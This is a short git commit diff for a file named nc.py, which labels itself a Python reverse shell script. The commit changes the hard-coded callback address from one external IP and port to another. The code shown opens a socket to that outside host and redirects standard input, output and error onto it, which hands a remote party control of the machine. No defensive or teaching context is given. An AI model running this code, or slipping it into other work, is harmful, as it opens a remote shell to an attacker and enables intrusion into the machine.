6da0cee82a00af625ec7da699ec0906187c160c2
teshushu <905353149@qq.com>
2023-01-12 12:12:22 +0800

    Update nc.py

--- nc.py
+++ nc.py
@@ -2,7 +2,7 @@
 # This is a Python reverse shell script
 import socket,subprocess,os;
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
-s.connect(("185.221.200.17",28085));
+s.connect(("51.178.137.94",8085));
 os.dup2(s.fileno(),0);
 os.dup2(s.fileno(),1);
 os.dup2(s.fileno(),2);
